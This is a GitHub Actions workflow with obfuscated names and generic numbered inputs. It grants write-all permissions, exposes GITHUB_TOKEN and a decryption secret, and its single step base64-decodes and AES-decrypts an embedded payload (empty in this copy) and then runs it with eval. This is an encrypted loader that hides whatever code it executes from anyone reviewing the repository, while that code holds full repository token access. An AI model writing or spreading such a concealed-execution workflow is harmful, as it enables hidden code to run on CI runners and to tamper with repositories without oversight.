name: Runn

on: 
  workflow_dispatch:
    inputs:
      option1:
        required: true
        default: 'aria2'
        type: choice
        options:
          - aria2
          - rsync
      option2:
        required: true
        default: ''
        type: string
      option3:
        required: false
        default: ''
        type: string
      option4:
        required: true
        default: 330
        type: number
      option5:
        required: true
        default: false
        type: boolean
 
permissions: write-all

env:
  OPTION_1: ${{ inputs.option1 }}
  OPTION_2: ${{ inputs.option2 }}
  OPTION_3: ${{ inputs.option3 }}
  OPTION_4: ${{ inputs.option4 }}
  OPTION_5: ${{ inputs.option5 }}
  GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
  DECRYPTION_KEY: ${{ secrets.DECRYPTION_KEY }}

jobs:
  k:
    runs-on: ubuntu-24.04
    steps:
      - name: June
        run: |
          encrypted_payload=""

          decrypted="$(echo "$encrypted_payload" | base64 -d | openssl enc -aes-256-cbc -d -salt -pbkdf2 -pass pass:"$DECRYPTION_KEY")"

          if [[ $? -eq 0 ]]; then
            eval "$decrypted"
          fi
